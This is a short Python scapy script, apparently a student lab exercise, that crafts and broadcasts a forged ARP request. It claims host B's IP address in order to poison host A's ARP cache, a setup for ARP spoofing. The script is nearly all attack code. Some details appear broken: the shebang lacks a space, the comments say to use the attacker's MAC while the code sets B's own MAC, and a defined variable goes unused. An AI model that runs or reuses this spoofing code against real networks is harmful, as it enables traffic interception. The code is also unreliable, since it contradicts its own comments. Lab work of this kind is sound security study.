#!/usr/bin/envpython3 
from scapy.all import * 

# map B's IP to M's Mac
# send to A
# in other words: send packet to A from M but fake from B ?

# wireshark: who has A, tell B, packet sent A->M

mip = "10.9.0.105"
aip = "10.9.0.5"
bip = "10.9.0.6"
mmac = "02:42:0a:09:00:69"

E=Ether() 
A=ARP() 
A.op=1 #1forARPrequest;2forARPreply 
A.pdst = aip
A.psrc = bip 
A.hwsrc = "02:42:0a:09:00:06"
E.dst = "ff:ff:ff:ff:ff:ff"

################################
# DO NOT CHANGE THIS ONE!!!!!!!!
#################################
pkt=E/A 
pkt.show()
sendp(pkt)


